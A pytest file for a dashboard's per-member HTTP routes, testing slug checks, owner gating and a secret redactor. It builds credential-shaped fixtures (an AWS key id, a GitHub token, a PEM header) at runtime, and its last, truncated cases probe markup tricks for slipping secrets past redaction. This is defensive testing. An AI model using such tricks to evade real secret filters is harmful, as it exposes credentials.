"""The crewmate dynamic dashboard HTTP routes (CONTRACT-v3 parts 4, 7 and "adopt").

The property worth guarding hardest is the one the sibling member routes already guard
and this surface adds a write to: WHICH crewmate's dashboard a request reaches is
decided from the slug plus the exact crew name, and a slug two crews share reaches
nobody's. An instance is one directory per slug, so serving a shared slug -- with an
editor -- would let two crewmates overwrite each other's dashboard.
"""

from __future__ import annotations

import base64
import hashlib
import json
import random
import re
import string
from contextlib import asynccontextmanager
from types import SimpleNamespace

import pytest
from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer

from kiro_crew import members as members_mod
from kiro_crew.dashboard.handlers import member_dashboard as routes
from kiro_crew.dashboard_templates import catalog, instance
from kiro_crew.platform.context import redact_via_context

#: The REAL resolvers, bound at import time.
#:
#: ``routes.members_mod`` is this same module object, so the autouse fixture's
#: ``member_slug`` stub replaces the attribute everywhere -- including for a test that
#: imports it directly. The slug cases below are ABOUT that function, so they need the
#: implementation rather than the constant the fixture installs.
_REAL_MEMBER_SLUG = members_mod.member_slug
_REAL_CANONICAL_KEY = members_mod.canonical_member_key

pytestmark = pytest.mark.asyncio

MEMBER = "Fleet Conductor"
SLUG = "fleet-conductor"

PAGE = '<div><b data-dashboard-field="credits"></b>' '<i data-dashboard-field="phase"></i></div>'
PAGE_EDITED = (
    '<section><span data-dashboard-field="credits"></span>'
    '<span data-dashboard-field="phase"></span></section>'
)


def _manifest(**over):
    raw = {
        "id": "fixture-board",
        "version": 1,
        "title": "Fixture board",
        "description": "A template these tests own.",
        "source": "builtin",
        "fields": {
            "credits": {"type": "number", "source": {"fold": "usage", "path": "credits"}},
            "phase": {"type": "string", "source": {"agentic": True}},
        },
    }
    raw.update(over)
    return raw


@pytest.fixture(autouse=True)
def _env(tmp_path, _floor_monkeypatch):
    """One fixture template, an isolated home, and the member checks stubbed.

    The member-identity checks are the SIBLING routes' and are tested there; what is
    stubbed is config loading, not the checks themselves -- ``_member_names_for_slug``
    still runs, so the shared-slug refusal below is the real code path.

    Patches through ``_floor_monkeypatch`` rather than the shared ``monkeypatch``
    (D11): an isolation patch on the test-owned undo stack is lifted by any test body
    that calls ``monkeypatch.undo()``, which would hand the rest of that test the real
    config loader and the real owner gate.
    """
    _floor_monkeypatch.setenv("KIROCREW_HOME", str(tmp_path / "home"))
    builtin = tmp_path / "builtin" / "fixture-board"
    builtin.mkdir(parents=True)
    (builtin / "manifest.json").write_text(json.dumps(_manifest()), encoding="utf-8")
    (builtin / "template.html").write_text(PAGE, encoding="utf-8")
    _floor_monkeypatch.setattr(catalog, "builtin_dir", lambda: builtin.parent)

    cfg = SimpleNamespace(agents={MEMBER: SimpleNamespace(member_id="")})
    _floor_monkeypatch.setattr(routes.KiroCrewConfig, "load", staticmethod(lambda: cfg))
    _floor_monkeypatch.setattr(routes.members_mod, "member_slug", lambda name, config=None: SLUG)
    _floor_monkeypatch.setattr(routes.members_mod, "validate_slug", lambda slug: slug)
    _floor_monkeypatch.setattr(routes.members_mod, "is_dispatchable_member_name", bool)
    _floor_monkeypatch.setattr(routes, "_member_names_for_slug", lambda cfg, slug: [MEMBER])
    # No app token, and the owner gate open: both are the sibling routes' boundaries
    # and are asserted structurally below rather than re-tested here.
    _floor_monkeypatch.setattr(routes, "_deny_app_caller", _none)
    _floor_monkeypatch.setattr(routes, "_owner_only", _none)
    # No DM session in a test, so a change records no history entry. That is the
    # documented degradation: the record is the file, the entry is history.
    _floor_monkeypatch.setattr(routes, "_write_session", lambda slug, member: "")
    yield


async def _none(*_a, **_k):
    return None


@asynccontextmanager
async def _client(state=None):
    """A started client that always closes.

    An ``async with`` helper rather than an ``@pytest.fixture``, by this repo's
    convention (see ``agent_panel_routes_helpers._client``): the pinned pytest-asyncio
    does not collect async-generator fixtures declared with plain ``@pytest.fixture``.

    Closing is not tidiness. A ``TestClient`` owns an aiohttp session AND a listening
    socket, so a returned-but-never-closed client leaks two descriptors per test and,
    on a loaded runner, fails UNRELATED tests with EMFILE.

    *state* stands in for the gateway's ``DashboardState`` where a case needs one;
    without it the app carries none, as every other case here reads it.
    """
    app = web.Application()
    if state is not None:
        app["state"] = state
    routes.register_member_dashboard_routes(app)
    c = TestClient(TestServer(app))
    await c.start_server()
    try:
        yield c
    finally:
        await c.close()


def _q(path: str, **extra) -> str:
    query = "&".join(
        [f"member={MEMBER.replace(' ', '+')}"] + [f"{k}={v}" for k, v in extra.items()]
    )
    return f"/api/members/{SLUG}/dashboard{path}?{query}"


# --------------------------------------------------------------------------
# the read the frame does
# --------------------------------------------------------------------------


async def test_a_crewmate_with_no_dashboard_answers_the_empty_state_not_a_404():
    async with _client() as client:
        resp = await client.get(_q(""))
        assert resp.status == 200
        body = await resp.json()
        # 200 + empty, deliberately. A 404 would make "nothing adopted yet" and "no such
        # member" one reading for the tab.
        assert body["state"] == "empty"
        assert body["instance_version"] == 0


async def test_an_empty_record_with_no_default_is_not_composed(caplog):
    """Nothing to compose, so nothing is attempted -- and nothing is logged.

    This fixture registers one built-in and it is not ``DEFAULT_TEMPLATE_ID``, so
    ``default_instance`` answers None: the ordinary state of a build whose registry
    carries the loader and no default page. An empty record carries ``manifest={}``,
    which ``parse_manifest`` refuses, so composing it logged a warning WITH a
    traceback for a crewmate that has simply adopted nothing -- on every poll and
    every projection frame. The frame's own empty state is the answer here and it
    needs no html.
    """
    import logging

    async with _client() as client:
        with caplog.at_level(logging.WARNING):
            body = await (await client.get(_q(""))).json()
    assert body["state"] == "empty"
    assert "rendered_html" not in body
    assert not [r for r in caplog.records if "could not fill" in r.getMessage()]


async def test_the_body_is_the_shape_the_contract_fixes():
    async with _client() as client:
        # Adopted through the store: the adopt ROUTE is not part of this layer, and
        # what these cases need is an instance to read, not the route that made one.
        instance.adopt(SLUG, "fixture-board")
        body = await (await client.get(_q(""))).json()
        assert set(body) >= {"instance_version", "template", "html", "manifest", "state"}
        assert body["template"] == {"id": "fixture-board", "version": 1}
        assert body["html"] == PAGE
        assert body["state"] == "live"


async def test_a_member_whose_name_does_not_derive_the_slug_is_refused(monkeypatch):
    async with _client() as client:
        monkeypatch.setattr(
            routes.members_mod, "member_slug", lambda name, config=None: "someone-else"
        )
        resp = await client.get(_q(""))
        assert resp.status == 400
        assert (await resp.json())["code"] == "member_slug_mismatch"


async def test_a_name_not_in_config_is_a_404(monkeypatch):
    async with _client() as client:
        monkeypatch.setattr(
            routes.KiroCrewConfig, "load", staticmethod(lambda: SimpleNamespace(agents={}))
        )
        resp = await client.get(_q(""))
        assert resp.status == 404
        assert (await resp.json())["code"] == "member_not_found"


async def test_a_slug_two_crews_share_serves_neither(monkeypatch):
    async with _client() as client:
        monkeypatch.setattr(routes, "_member_names_for_slug", lambda cfg, slug: [MEMBER, "Other"])
        resp = await client.get(_q(""))
        assert resp.status == 409
        assert (await resp.json())["code"] == "dashboard_slug_ambiguous"


async def test_a_request_with_no_member_is_refused():
    async with _client() as client:
        resp = await client.get(f"/api/members/{SLUG}/dashboard")
        assert resp.status == 400
        assert (await resp.json())["code"] == "missing_member"


async def test_the_preview_read_serves_the_staged_page_and_links_to_the_tab():
    """The read the Dashboard tab makes for a preview.

    The tab draws ``rendered_html`` under its preview band and reads ``preview`` to
    know which page it holds, so both must be on this body.
    """
    async with _client() as client:
        instance.stage_preview(SLUG, template_id="fixture-board")
        resp = await client.get(_q("", preview="1"))
        assert resp.status == 200, await resp.text()
        body = await resp.json()
    assert body["preview"] is True
    assert body["template"] == {"id": "fixture-board", "version": 1}
    assert "rendered_html" in body
    # Nothing was adopted, so the version a reader caches by has not moved.
    assert instance.read(SLUG).instance_version == 0


async def test_a_preview_read_with_nothing_staged_is_a_404_the_tab_can_name():
    async with _client() as client:
        resp = await client.get(_q("", preview="1"))
        assert resp.status == 404
        assert (await resp.json())["code"] == "no_preview"


def _template_at_the_ceiling() -> str:
    """A second template whose page is exactly the frame's ceiling. Returns the page."""
    from kiro_crew import dashboard_frame

    head, tail = PAGE + "<script>", "</script>"
    page = head + "x" * (dashboard_frame.MAX_PAGE_BYTES - len(head) - len(tail)) + tail
    directory = catalog.builtin_dir() / "big-board"
    directory.mkdir()
    manifest = _manifest(id="big-board", title="Big board")
    (directory / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
    (directory / "template.html").write_text(page, encoding="utf-8")
    return page


async def test_a_template_page_at_the_frames_ceiling_previews_applies_and_draws(monkeypatch):
    """The template-folder path at the ceiling, end to end, with the scrub off the loop.

    The read scrubs the stored page before it answers, and near the ceiling that takes
    hundreds of milliseconds -- so it runs off the event loop, where the pause would
    otherwise land on every other session's chat.
    """
    import threading

    page = _template_at_the_ceiling()
    loop_thread = threading.current_thread()
    on_loop: list[bool] = []
    scrub = routes._safe_body

    def _scrub(body):
        on_loop.append(threading.current_thread() is loop_thread)
        return scrub(body)

    monkeypatch.setattr(routes, "_safe_body", _scrub)
    async with _client() as client:
        instance.stage_preview(SLUG, template_id="big-board")
        resp = await client.get(_q("", preview="1"))
        assert resp.status == 200, await resp.text()
        preview = await resp.json()
        instance.apply_preview(SLUG)
        resp = await client.get(_q(""))
        assert resp.status == 200, await resp.text()
        live = await resp.json()
    assert preview["preview"] is True and page in preview["rendered_html"]
    assert live["state"] == "live" and page in live["rendered_html"]
    assert live["template"] == {"id": "big-board", "version": 1}
    assert on_loop == [False, False]


async def test_a_preview_read_the_store_refuses_answers_in_the_stores_words(monkeypatch):
    """A store refusal on the staged read (a linked session directory raises
    `InstanceError`) is the route's structured answer, not aiohttp's bare 500."""
    from kiro_crew.dashboard.handlers import member_dashboard as md

    def _refuse(_slug):
        raise instance.InstanceError("the session dashboard directory is a link")

    monkeypatch.setattr(md, "_preview_record", _refuse)
    async with _client() as client:
        resp = await client.get(_q("", preview="1"))
        assert resp.status == 500
        assert (await resp.json())["code"] == "dashboard_failed"


# --------------------------------------------------------------------------
# adopt, edit, rollback
# --------------------------------------------------------------------------


async def test_a_live_dashboard_comes_back_with_its_values_filled_in(monkeypatch):
    """The frame renders ``rendered_html``: the page under the data island the host built.

    Fold values come through the feed and agentic ones from the slot's ``agentic`` fold;
    both are stubbed at their seams, so this pins the WIRING -- the route asks for the
    values and hands the page back filled, with the agentic field named as such.
    """
    from kiro_crew import dashboard_feed
    from kiro_crew.crew_log import projection

    class FakeFeed:
        def __init__(self, slot, unit="", panel_record=None):
            self.slot = slot

        def subscribe(self, manifest):
            return []

        def read(self, manifest, agentic=None):
            out = dashboard_feed.FieldRead()
            out.fields = {"credits": 1.5, "phase": agentic["fields"]["phase"]["value"]}
            out.seq = 7
            return out

        def wait_for_primes(self):
            pass

        def unsubscribe(self):
            pass

    monkeypatch.setattr(dashboard_feed, "DashboardFeed", FakeFeed)
    monkeypatch.setattr(
        projection,
        "read_slot_projection",
        lambda slot, name: SimpleNamespace(value={"fields": {"phase": {"value": "reviewing"}}}),
    )
    async with _client() as client:
        # Adopted through the store: the adopt ROUTE is not part of this layer, and
        # what these cases need is an instance to read, not the route that made one.
        instance.adopt(SLUG, "fixture-board")
        body = await (await client.get(_q(""))).json()
    rendered = body["rendered_html"]
    assert body["html"] == PAGE
    assert PAGE in rendered and "kirocrew-dashboard-data" in rendered
    island = rendered.split('id="kirocrew-dashboard-data">', 1)[1].split("</script>", 1)[0]
    read = json.loads(island)
    assert read["fields"] == {"credits": 1.5, "phase": "reviewing"}
    assert read["agentic"] == ["phase"] and read["seq"] == 7
    # No locale asked for: the page renders its own words in English.
    assert read["locale"] == "en"

    # The reader's UI language reaches the page; one the app does not ship is English.
    async with _client() as client:
        for asked, got in (("zh-CN", "zh-CN"), ("xx-YY", "en")):
            body = await (await client.get(_q("", locale=asked))).json()
            island = body["rendered_html"].split('id="kirocrew-dashboard-data">', 1)[1]
            assert json.loads(island.split("</script>", 1)[0])["locale"] == got, asked


def test_no_worker_session_key_survives_the_render_mask():
    """The page is served by a route with NO owner check.

    The conductor ledger's rule is that no reader but the conductor sees a session
    key, and a template decides for itself which fold reaches its page and how deep
    it walks into it -- so the mask is recursive and keyed on the FIELD NAME rather
    than on one fold's item shape. A mask written against the shape that exists today
    covers the template adopted today and not the one adopted tomorrow.

    A ``bind`` event's whole text IS the key, so emptying the item field alone leaves
    it on the page inside the event log while a per-row check passes. The line stays,
    because its ``kind`` and ``ts`` are when dispatch happened.
    """
    key = "chat-9-worker"
    value = {
        "items": [
            {
                "id": "it_1",
                "worker_session_key": key,
                "events": [
                    {"kind": "bind", "ts": 1, "text": key},
                    {"kind": "report", "ts": 2, "text": "all green"},
                ],
            }
        ],
        "nested": {"deeper": [{"worker_session_key": key}]},
    }
    masked = routes._page_safe(value)
    assert key not in json.dumps(masked), "a worker session key survived the mask"
    item = masked["items"][0]
    assert "worker_session_key" not in item
    assert [e["kind"] for e in item["events"]] == ["bind", "report"], "an event line was dropped"
    assert item["events"][0]["text"] == "", "the bind event still carries its key"
    # A control: the mask is not simply blanking the payload.
    assert item["events"][1]["text"] == "all green"
    assert item["id"] == "it_1"


def test_a_credential_in_a_fold_value_is_redacted_before_it_reaches_the_page():
    """Every string here is AGENT-AUTHORED and nothing before this read inspects it.

    A fold value is whatever a conductor wrote into the crew log, so a
    `session_ledger_record(goal=...)` carrying a pasted key is rendered by any template
    binding that fold. Dropping the one field known to be a secret says nothing about
    prose that happens to contain one.

    Mapping KEYS too: an artifact name is a free string the agent chose and reaches the
    browser the same way its value does.
    """
    # ASSEMBLED at runtime, never written out whole. The internal-content scan reads
    # this change's own diff, so a credential-shaped literal added here is a finding
    # against the PR whatever the surrounding code is for -- and a test that proves
    # secrets are redacted is a poor place to put one in plain text. The runtime value
    # is a real key header and a real token shape, which is what the redactor has to
    # recognise; only the source spelling is split. Do not join these back up.
    _dashes = "-" * 5
    _kind = "RSA PRIVATE KEY"
    pem = (
        f"{_dashes}BEGIN {_kind}{_dashes}\n"
        "MIIEowIBAAKCAQEA3Zx8kUoTBqQw0hXvPj9mKpLq2yTnVr7dFcBg6WsEnJaHtYuZ\n"
        f"{_dashes}END {_kind}{_dashes}"
    )
    token = "ghp" + "_" + "ZXAMPLEzxampleZXAMPLEzxampleZXAMPLE12"
    value = {
        "goal": f"ship the thing; key is {pem}",
        "items": [{"summary": f"used {token} to fetch it"}],
        token: "an artifact whose NAME is the secret",
    }
    out = routes._page_safe(value)
    blob = json.dumps(out)
    assert f"BEGIN {_kind}" not in blob, f"a key block reaches the page: {blob[:300]}"
    assert token not in blob, f"a token reaches the page: {blob[:300]}"
    # Still a page, not a blank: the prose around the secret survives.
    assert "ship the thing" in out["goal"]
    assert "used" in out["items"][0]["summary"]


async def test_a_stale_copy_is_still_composed_with_its_values(monkeypatch, tmp_path):
    """A STALE copy renders. It is the state where the copy cannot be compared
    against its source, not a state where it stopped working.

    Served without composing it carries no data island, so the page draws no values at
    all -- and a template version bump is enough to put every adopted dashboard on that
    template into this state, which makes it the common failure rather than a corner.
    """
    from kiro_crew import dashboard_feed

    class FakeFeed:
        def __init__(self, slot, unit="", panel_record=None):
            self.slot = slot

        def subscribe(self, manifest):
            return []

        def read(self, manifest, agentic=None):
            out = dashboard_feed.FieldRead()
            out.fields = {"credits": 2.5}
            out.seq = 9
            return out

        def wait_for_primes(self):
            pass

        def unsubscribe(self):
            pass

    monkeypatch.setattr(dashboard_feed, "DashboardFeed", FakeFeed)
    async with _client() as client:
        # Adopted through the store: the adopt ROUTE is not part of this layer, and
        # what these cases need is an instance to read, not the route that made one.
        instance.adopt(SLUG, "fixture-board")
        # The registry moves on, which is what makes the stored copy stale.
        builtin = tmp_path / "builtin" / "fixture-board"
        builtin.joinpath("manifest.json").write_text(
            json.dumps(_manifest(version=2)), encoding="utf-8"
        )
        catalog.load_one.cache_clear() if hasattr(catalog.load_one, "cache_clear") else None
        resp = await client.get(_q(""))
        body = await resp.json()
    assert resp.status == 200
    assert body["state"] == "stale", "the registry bump did not make the copy stale"
    assert "rendered_html" in body, "a stale copy was served without being composed"
    rendered = body["rendered_html"]
    assert "kirocrew-dashboard-data" in rendered, "the stale page carries no data island"
    island = rendered.split('id="kirocrew-dashboard-data">', 1)[1].split("</script>", 1)[0]
    assert json.loads(island)["fields"] == {"credits": 2.5}


async def test_a_page_whose_values_cannot_be_read_still_answers_without_them(monkeypatch):
    from kiro_crew import dashboard_feed

    def boom(*_a, **_k):
        raise RuntimeError("bus down")

    monkeypatch.setattr(dashboard_feed, "DashboardFeed", boom)
    async with _client() as client:
        # Adopted through the store: the adopt ROUTE is not part of this layer, and
        # what these cases need is an instance to read, not the route that made one.
        instance.adopt(SLUG, "fixture-board")
        resp = await client.get(_q(""))
        body = await resp.json()
    assert resp.status == 200 and body["state"] == "live" and "rendered_html" not in body


# --------------------------------------------------------------------------
# the boundaries, asserted structurally
# --------------------------------------------------------------------------


async def test_every_route_denies_an_app_caller_and_gates_the_values_it_serves():
    """Read off the source, because a passing request proves only the open path.

    The stubs above open both gates so the behaviour can be tested at all, which means
    no request in this file can show that a real app token or a non-owner is refused.
    What CAN be shown is that every handler calls the guards -- which is the boundary a
    new route is most likely to be added without.
    """
    import ast
    import inspect

    tree = ast.parse(inspect.getsource(routes))
    handlers = {
        node.name: node
        for node in ast.walk(tree)
        if isinstance(node, ast.AsyncFunctionDef) and node.name.startswith("api_")
    }
    # Held to the ROUTE TABLE rather than to a number typed here: a handler added
    # without a route, or a route pointed at something that is not a handler, is the
    # drift this count exists to catch, and a literal would just be updated alongside.
    app = web.Application()
    routes.register_member_dashboard_routes(app)
    registered = {r.handler.__name__ for r in app.router.routes() if r.method in {"GET", "POST"}}
    assert set(handlers) == registered
    for name, node in handlers.items():
        called = {
            n.func.id
            for n in ast.walk(node)
            if isinstance(n, ast.Call) and isinstance(n.func, ast.Name)
        }
        # Every crewmate handler resolves, and _resolve is where the app-caller denial
        # and the four member-identity checks live. One chokepoint, so a new route
        # cannot forget one of five rules. The SESSION read names no member, so it
        # carries the app-caller denial itself.
        if name in _SESSION_READS:
            assert "_deny_app_caller" in called, f"{name} does not deny an app caller"
        else:
            assert "_resolve" in called, f"{name} does not resolve the member"
        if name in _VALUE_SERVING_READS:
            assert "_owner_only" in called, f"{name} is not owner-gated"


#: Reads that serve this crewmate's FOLD VALUES, which are work-ledger and crew-log
#: data: task titles, summaries, PR links. ``work_ledger_board`` answers a non-owner
#: ``owner_only`` for exactly those, so this one cannot answer 200 to the same caller
#: just because its copy arrives as rendered html.
#:
#: A SET rather than a check inside the loop, so adding a route that serves values is a
#: one-line change HERE and a visible one in review.
_VALUE_SERVING_READS = frozenset({"api_member_dashboard", "api_session_dashboard"})

#: Reads keyed by a root session's slot rather than by a crewmate.
_SESSION_READS = frozenset({"api_session_dashboard"})


async def test_a_non_owner_cannot_read_a_crewmates_values():
    """The gate, exercised rather than read off the source.

    The route-walk above proves the CALL is there; this proves it refuses.
    """
    import kiro_crew.dashboard.handlers.member_dashboard as mod

    async def _deny(request, operation):
        _deny.operations.append(operation)
        # A FRESH response each call. An aiohttp response carries its own write state,
        # so handing the same object to two requests hangs the second one.
        return web.json_response({"error": "owner authorization required"}, status=403)

    _deny.operations = []
    original = mod._owner_only
    mod._owner_only = _deny
    try:
        async with _client() as client:
            resp = await client.get(_q(""))
            assert resp.status == 403, (
                f"GET / answered {resp.status} for a non-owner, so a crewmate's "
                "fold values reach a caller the sibling board refuses"
            )
    finally:
        mod._owner_only = original
    assert _deny.operations == ["members.dashboard"], (
        "the read must name its own operation, so the SEL denial says which surface " "was refused"
    )


async def test_the_gateway_registers_exactly_these_paths_without_importing_us():
    """The boot path binds these routes DEFERRED, so the paths are written twice.

    The same property ``test_agent_panel_routes_allocation`` pins, for the same reason: the boot
    path may not import an optional subsystem before the socket binds, so it restates
    each path against ``server._deferred`` -- and a restated path can drift. A route
    renamed here and not there would 404 in the gateway while every test above passed.

    Compares the two SETS, so a route added to either side has to be added to both.
    """
    import inspect

    from kiro_crew.dashboard import server

    app = web.Application()
    routes.register_member_dashboard_routes(app)
    ours = {str(r.resource.canonical) for r in app.router.routes()}
    flat = " ".join(inspect.getsource(server._register_mcp_routes).split())
    deferred = {path for path in ours if f'"{path}", _deferred("member_dashboard",' in flat}
    missing = ours - deferred
    assert not missing, (
        f"{sorted(missing)} are registered by this module but the gateway boot path "
        "does not bind them through the deferred binder, so they are either unserved "
        "or imported eagerly"
    )


async def test_the_instance_store_and_the_route_agree_on_the_states():
    """The four state words the frame branches on are the store's own constants."""
    assert {
        instance.STATE_EMPTY,
        instance.STATE_LIVE,
        instance.STATE_STALE,
        instance.STATE_ERROR,
    } == {"empty", "live", "stale", "error"}


# --------------------------------------------------------------------------- #
# the helpers the route leans on, driven directly
# --------------------------------------------------------------------------- #

#: The REAL helper, bound at import time. The autouse ``_env`` fixture stubs
#: ``routes._write_session`` so the route cases get a dashboard with no history row,
#: and it stubs it through ``_floor_monkeypatch``, which a test body cannot undo by
#: design. The cases below drive the helper itself, so they hold their own reference
#: to it, taken before any fixture runs.
_REAL_WRITE_SESSION = routes._write_session


def test_the_history_session_is_the_newest_by_SUCCESSION_not_by_the_clock(monkeypatch):
    """A change's history entry belongs to the LIVE session, chosen causally.

    A unit's ``createdAt`` is stamped once and never rewritten, so a clock that steps
    backward between two units of one slot lists the retired unit last. Reading the
    newest off that listing would attribute every later change to a session that is
    already over. Driven through the succession helper, which returns the chain order,
    and asserted against the opposite clock order so a fallthrough to the header
    listing fails this case rather than passing it.
    """
    from kiro_crew.crew_log import projection as crew_log

    monkeypatch.setattr(routes, "_dashboard_slot", lambda member, slug: "chat-dm")
    # The clock order, which is inverted here: the retired unit sorts last.
    monkeypatch.setattr(crew_log, "session_units_for_slot", lambda slot: ("live", "retired"))
    # The durable chain, which puts the live unit where "newest" has to read it.
    monkeypatch.setattr(crew_log, "units_in_succession", lambda slot: ("retired", "live"))

    assert _REAL_WRITE_SESSION(SLUG, MEMBER) == "live"


def test_a_crewmate_with_no_dm_session_gets_no_history_row_rather_than_a_refusal(monkeypatch):
    """No DM thread is a working dashboard with no history row, not a failed change.

    The instance record is a file and is already committed by the time this is used,
    so refusing here would lose a change that had already landed.
    """
    from kiro_crew.crew_log import projection as crew_log

    monkeypatch.setattr(routes, "_dashboard_slot", lambda member, slug: "chat-dm")
    monkeypatch.setattr(crew_log, "units_in_succession", lambda slot: ())
    assert _REAL_WRITE_SESSION(SLUG, MEMBER) == ""


def test_an_unreadable_crew_log_is_the_same_no_history_answer(monkeypatch):
    """A store that raises is reported as no session, not propagated.

    Same reason as the empty case: the record is already written, so the history row is
    the part that may be missing and the change is not.
    """
    from kiro_crew.crew_log import projection as crew_log

    def _boom(_slot):
        raise RuntimeError("the crew log is unreadable")

    monkeypatch.setattr(routes, "_dashboard_slot", lambda member, slug: "chat-dm")
    monkeypatch.setattr(crew_log, "units_in_succession", _boom)
    assert _REAL_WRITE_SESSION(SLUG, MEMBER) == ""


class TestTheRefusalMapping:
    """A store refusal and a gateway fault are separate answers for a client.

    ``*_refused`` is the caller's input, so the same request will be refused again;
    ``*_failed`` is this gateway's state and a retry may work. Collapsing them makes a
    client either retry forever or give up on a transient fault.
    """

    def test_a_refused_instance_is_the_callers_input(self):
        resp = routes._refusal(instance.InstanceRefused("that template is not adoptable"))
        assert resp.status == 409
        assert json.loads(resp.text)["code"] == "dashboard_refused"

    def test_an_unknown_template_is_not_found(self):
        resp = routes._refusal(catalog.UnknownTemplate("no-such-page"))
        assert resp.status == 404
        assert json.loads(resp.text)["code"] == "template_not_found"

    def test_anything_else_is_this_gateways_fault(self):
        resp = routes._refusal(OSError("the disk went away"))
        assert resp.status == 500
        assert json.loads(resp.text)["code"] == "dashboard_failed"
        # The cause is NOT handed to the client: it is this gateway's state, and the
        # message would carry a path or a store detail the caller has no business
        # reading. It goes to the log instead.
        assert "disk went away" not in resp.text


class TestTheSlugChecks:
    """A slug the member resolver REFUSES and one it merely disagrees with are
    different answers, and both arrive as an exception rather than as a comparison."""

    async def test_an_invalid_slug_is_refused_before_the_member_is_read(self, monkeypatch):
        def _raise(_slug):
            raise routes.MemberSlugError("not a slug")

        monkeypatch.setattr(routes.members_mod, "validate_slug", _raise)
        async with _client() as c:
            resp = await c.get(f"/api/members/{SLUG}/dashboard?member={MEMBER}")
            assert resp.status == 400, await resp.text()
            assert (await resp.json())["code"] == "invalid_member_slug"

    async def test_a_member_whose_slug_cannot_be_derived_is_a_mismatch(self, monkeypatch):
        def _raise(_name, _config=None):
            raise routes.MemberSlugError("no slug for this name")

        monkeypatch.setattr(routes.members_mod, "member_slug", _raise)
        async with _client() as c:
            resp = await c.get(f"/api/members/{SLUG}/dashboard?member={MEMBER}")
            assert resp.status == 400, await resp.text()
            assert (await resp.json())["code"] == "member_slug_mismatch"


def test_a_credential_in_a_page_is_redacted_before_it_reaches_the_reader():
    """The page goes through the same scrub as the values filled into it.

    Only a template that shipped with the product can become a page, and that is a
    claim about the repository rather than about the bytes on this disk: a hand-edited
    template directory, or an instance record written under an older gateway, arrives
    here having passed a parity check, which says nothing about a credential pasted
    into a heading. `_page_safe` covers only the resolved values, never the page around
    them.
    """
    # ASSEMBLED at runtime for the reason the fold-value case above gives: a
    # credential-shaped literal in the diff is a finding against the PR whatever the
    # code around it is for. Do not join these back up.
    token = "AKIA" + "IOSFODNN7" + "EXAMPLE"
    page = f'<p>key {token}</p><b data-dashboard-field="credits"></b>'
    assert token not in routes._template_text_safe(page), "a page kept its credential"
    assert "credits" in routes._template_text_safe(page), "the redaction ate the bindings"


#: 62 letters and digits, then 18 marks: the 80-character palette a pixel-art page indexes
#: into. Any 40-character window of it holds forty distinct characters, which is what the
#: bare-secret pass reads as a key.
_PALETTE = string.ascii_lowercase + string.ascii_uppercase + string.digits + "#$%&*+-=?@^_~:;<>!"


def _bare_key() -> str:
    """Forty base64 characters of a digest: a label-less secret key, built at runtime."""
    return base64.b64encode(hashlib.sha256(b"kc-bare-0").digest()).decode()[:40]


def test_a_script_is_served_as_its_author_wrote_it():
    """The bare-secret pass reads an alphabet as a key, and the page ran on the marker.

    The script loaded, nothing reported an error, and every lookup into the alphabet
    answered the wrong index.
    """
    page = f'<canvas id="c"></canvas><script>var ART_CHARS = "{_PALETTE}";</script>'
    assert redact_via_context(page) != page, "the premise: the whole-page pass rewrites it"
    assert routes._template_text_safe(page) == page


@pytest.mark.parametrize(
    "template",
    [
        "<style>@font-face {{ font-family: X; src: url(data:font/woff2;base64,{blob}) }}</style>",
        "<style>.a {{ background: url(data:image/png;base64,{blob}) }}</style>",
        "<script>var img = new Image(); img.src = 'data:image/png;base64,{blob}';</script>",
        '<script type="application/json">{{"font": "data:font/woff2;base64,{blob}"}}</script>',
    ],
)
def test_a_long_base64_data_uri_in_a_stylesheet_or_script_is_served_as_written(template):
    """A font or an image inlined into the page's code is binary, so the bare-secret
    pass reads windows of it as keys and the browser then decodes the marker."""
    blob = base64.b64encode(
        b"".join(hashlib.sha256(bytes([n])).digest() for n in range(12))
    ).decode()
    page = template.format(blob=blob)
    assert redact_via_context(page) != page, "the premise: the whole-page pass rewrites it"
    assert routes._template_text_safe(page) == page


def test_the_same_run_outside_a_script_or_stylesheet_is_still_masked():
    run = _PALETTE[:62]
    for page in (
        f"<p>{run}</p>",
        f'<p title="{run}">x</p>',
        f'<a href="#" onclick="draw(\'{run}\')">x</a>',
        f'<script src="/lib.js" data-key="{run}"></script>',
    ):
        assert run not in routes._template_text_safe(page), page


def test_a_label_less_key_in_visible_text_is_masked_beside_a_script_that_keeps_its_literal():
    page = f"<script>var A = '{_PALETTE}';</script><p>key {_bare_key()}</p>"
    out = routes._template_text_safe(page)
    assert f"var A = '{_PALETTE}';" in out
    assert _bare_key() not in out


def test_a_credential_written_into_a_script_or_stylesheet_is_still_masked():
    # ASSEMBLED at runtime for the reason the page case above gives.
    dashes = "-" * 5
    kind = "RSA PRIVATE KEY"
    secrets = [
        "AKIA" + "IOSFODNN7" + "EXAMPLE",
        "ghp" + "_" + "ZXAMPLEzxampleZXAMPLEzxampleZXAMPLE12",
        f"{dashes}BEGIN {kind}{dashes}\nMIIEowIBAAKCAQEA3Zx8kUoTBqQw0hXvPj9mKpLq2yTnVr7\n"
        f"{dashes}END {kind}{dashes}",
    ]
    for secret in secrets:
        for page in (
            f"<script>var k = `{secret}`; draw(k);</script>",
            f"<style>/* {secret} */ .a {{ color: red }}</style>",
        ):
            out = routes._template_text_safe(page)
            assert secret not in out, page
            assert out.startswith(page[:8]) and out.endswith(page[-9:]), "the tags were eaten"


@pytest.mark.parametrize("keep_first", [True, False])
@pytest.mark.parametrize("length", [30, 36, 39])
def test_a_key_id_glued_to_a_partial_key_is_masked_as_one_run_beside_a_style(keep_first, length):
    """The full pass reads the two as one run; rewriting the id first leaves a tail under 40."""
    key_id = "AKIA" + "IOSFODNN7" + "EXAMPLE"
    tail = _bare_key()[:length]
    run = key_id + tail if keep_first else tail + key_id
    page = f"<p>{run}</p><style>a {{ color: red }}</style>"
    out = routes._template_text_safe(page)
    assert out == redact_via_context(page)
    assert tail not in out


def test_a_script_holding_a_masked_credential_still_keeps_its_literal():
    """The page changes under the scrub here, so the result is read again before it is served."""
    key_id = "AKIA" + "IOSFODNN7" + "EXAMPLE"
    page = f"<script>var A = '{_PALETTE}'; var k = '{key_id}';</script><p>{_bare_key()}</p>"
    out = routes._template_text_safe(page)
    assert f"var A = '{_PALETTE}';" in out
    assert key_id not in out
    assert _bare_key() not in out


@pytest.mark.parametrize(
    "template",
    [
        # A PEM block wraps a nested script opener, so the first end tag after it closes the script.
        "<script>\n{pem}\n// </script><p>{key}</p>\n</script>",
        # A labelled value runs through the start tag that follows its label, or the end tag.
        "aws_secret_access_key=<script>{key}</script>",
        "aws_secret_access_key=<script/c>{key}</script>",
        "<script/aws_secret_access_key=>{key}</script>",
